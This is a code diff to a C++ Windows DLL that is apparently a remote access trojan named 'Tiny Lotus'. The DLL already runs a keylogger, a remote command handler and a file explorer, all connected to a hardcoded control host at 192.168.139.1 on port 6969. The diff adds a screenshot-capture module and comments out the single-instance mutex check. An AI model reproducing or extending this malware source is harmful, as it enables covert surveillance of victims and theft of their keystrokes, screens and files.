@@ -15,15 +15,18 @@ RemoteCommand*	CmdObj;
 Info*			InfoObj;
 Keylogger*		KeyloggerObj;
 FileExplorer*	FileExplorerObj;
+Screenshot*		ScreenshotObj;
 
-struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"TL_TEST","192.168.139.1", 6969, L"TINY_LOTUS@2sd4", true, "Tiny Lotus"};
+struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"TINYLOTUS 0.1","192.168.139.1", 6969, L"TINY_LOTUS@2sd4", true, "Tiny Lotus"};
 
 bool Init()
 {
+	/*
 	if (OpenMutex(SYNCHRONIZE, FALSE, conf.mutex) == NULL)
 		CreateMutex(NULL, TRUE, conf.mutex);
 	else
 		return false;
+	*/
 
 	//Connection class
 	ConnObj = new Connection(conf.hostIP, conf.port);
@@ -41,6 +44,8 @@ bool Init()
 	KeyloggerObj->Start();
 	FileExplorerObj = new FileExplorer(ConnObj);
 	ObjList->RegisterObj(FileExplorerObj);
+	ScreenshotObj = new Screenshot(ConnObj);
+	ObjList->RegisterObj(ScreenshotObj);
 
 	return true;
 }
@@ -102,5 +107,5 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
         // Perform any necessary cleanup.
         break;    
     }
-        return TRUE;
+    return TRUE;
 }
